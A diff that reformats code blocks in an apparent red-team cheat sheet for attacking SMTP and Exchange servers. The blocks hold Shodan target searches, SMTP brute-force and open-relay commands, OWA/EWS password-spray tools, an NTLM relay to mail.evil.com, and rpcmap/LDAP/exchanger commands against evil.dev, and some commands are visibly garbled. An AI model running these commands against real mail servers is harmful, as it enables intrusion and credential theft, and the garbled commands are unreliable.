@@ -117,7 +117,7 @@ shodan search "port:587"
 #### NTLM Auth
 
 ```bash
-   telnet example.com 587 
+telnet example.com 587 
 HELO
 AUTH NTLM 334 
 ```
@@ -131,8 +131,7 @@ AUTH NTLM 334
 #### Bruteforce
 
 ```bash
-   nmap -p[25,465,587] --script smtp-brute
- <target>
+   nmap -p[25,465,587] --script smtp-brute <target>
 ```
 
 ```bash
@@ -148,7 +147,7 @@ AUTH NTLM 334
 #### Non Auth
 
 ```bash
-   telnet [IP] [25 or 465 or 587]
+telnet [IP] [25 or 465 or 587]
 MAIL FROM: sender@adress.ext
 RCPT TO: recipient@adress.ext
 SUBJECT: Test message
@@ -180,7 +179,7 @@ SUBJECT: Test message
 #### Anti-Malware
 
 ```bash
-   evilmacro
+evilmacro
 macropack
 ...
 ```
@@ -209,7 +208,7 @@ macropack
 #### Known Vuln
 
 ```bash
-   CVE‑2022‑37042
+CVE‑2022‑37042
 CVE‑2022‑37041
 CVE‑2022‑37044
 ```
@@ -238,7 +237,7 @@ CVE‑2022‑37044
 #### Anti-Malware
 
 ```bash
-   evilmacro
+evilmacro
 macropack
 ...
 ```
@@ -282,7 +281,7 @@ macropack
 ### Information Gathering
 
 ```bash
-  shodan search "'X-AspNet-Version http.title:'Outlook' –'x-owa-version'"
+shodan search "'X-AspNet-Version http.title:'Outlook' –'x-owa-version'"
 shodan search "http.favicon.hash:44274939"
 shodan search "http.title:outlook exchange"
 ```
@@ -300,7 +299,7 @@ shodan search "http.title:outlook exchange"
 #### Known Vuln
 
 ```bash
-   ProxyLogon(2021-26855)
+ProxyLogon(2021-26855)
 ProxyShell(2021-34473)
 HAFNIUM(2021-26858)
 ```
@@ -308,7 +307,7 @@ HAFNIUM(2021-26858)
 #### Spray
 
 ```bash
-   Invoke-PasswordSprayOWA
+Invoke-PasswordSprayOWA
 Invoke-PasswordSprayEWS
 ```
 
@@ -321,22 +320,21 @@ Invoke-PasswordSprayEWS
 #### NTLMRelay
 
 ```bash
-   reponder
+reponder
 ./exchangeRelayx.py -t https://mail.evil.com
 ```
 
 #### GAL
 
 ```bash
-   Get-GlobalAddressList -ExchHostname mail.domain.com -UserName
-
+Get-GlobalAddressList -ExchHostname mail.domain.com -UserName
 domain\username -Password password -OutFile global-address-list.txt
 ```
 
 #### Exchange Admin Group Deligation
 
 ```bash
-   Bloodhound
+Bloodhound
 net
 ```
 
@@ -361,7 +359,7 @@ net
 #### Anti-Malware
 
 ```bash
-   evilmacro
+evilmacro
 macropack
 ...
 ```
@@ -394,24 +392,24 @@ macropack
 
 
 ```bash
-   rpcmap . py -debug -auth-transport’EVIL/user:password’
+ rpcmap . py -debug -auth-transport’EVIL/user:password’
 'ncacn http: /6001,RpcProxy=mail.evil.dev: 443]'
 ```
 
 
 ```bash
-   rpcmap.py -debug -auth-transport 'EVIL/user:password' -auth-rpc 'EVIL/mia:password' -auth-level 6 -brute-opnums 'ncacn_http:[6001,RpcProxy=mail.evil.dev:443]'
+ rpcmap.py -debug -auth-transport 'EVIL/user:password' -auth-rpc 'EVIL/mia:password' -auth-level 6 -brute-opnums 'ncacn_http:[6001,RpcProxy=mail.evil.dev:443]'
 ```
 
 #### LDAP
 
 ```bash
-   LDAPPER. py -D EVIL - U 'Administrator' -P ‘password’ -S DC01. EVIL.DEV
+ LDAPPER. py -D EVIL - U 'Administrator' -P ‘password’ -S DC01. EVIL.DEV
 (mail=user@evil.dev) mail objectGUID legacyExchangeDN distinguishedName
 ```
 
 ```bash
-   exchanger. py EVIL/user: ‘password’@mail.evil.dev nspi
+exchanger. py EVIL/user: ‘password’@mail.evil.dev nspi
 dump -tables -name Hackers -lookup-tvpe EXTENDED
 ```
 
